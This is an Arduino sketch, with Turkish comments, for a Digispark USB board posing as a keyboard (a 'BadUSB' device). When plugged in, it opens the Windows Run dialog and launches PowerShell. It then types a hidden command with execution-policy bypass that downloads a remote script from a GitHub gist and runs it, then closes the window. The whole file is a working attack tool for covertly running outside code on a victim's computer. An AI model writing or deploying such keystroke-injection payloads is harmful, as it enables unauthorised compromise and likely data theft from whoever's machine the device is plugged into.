#define kbd_tr_tr
#include "DigiKeyboard.h"

bool runOnce = true;

void setup() {
  DigiKeyboard.delay(2000); // Sistemin hazır olmasını bekle
}

void loop() {
  if (runOnce) {
    DigiKeyboard.sendKeyStroke(0); // Bir tuş simülasyonu gönder (aktiflik sağlamak için)
    DigiKeyboard.delay(500);

    // Win + R → Çalıştır penceresi açılır
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(500);

    // PowerShell aç
    DigiKeyboard.print("powershell");
    DigiKeyboard.delay(300);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(800);

    // Gist linkinden uzaktan PowerShell scriptini çalıştır
    DigiKeyboard.print("powershell -w hidden -ep bypass -c \"iex (iwr -UseBasicParsing 'https://gist.github.com/Eren-Oztk/147edce7b621e8822e3a8358a58ca3ff.js/tg.ps1')\"");
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);

    // Komutun işlenmesini bekle
    DigiKeyboard.delay(3000);

    // PowerShell kapat
    DigiKeyboard.print("exit");
    DigiKeyboard.delay(300);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);

    runOnce = false; // Bir daha çalışmasın
  }
}
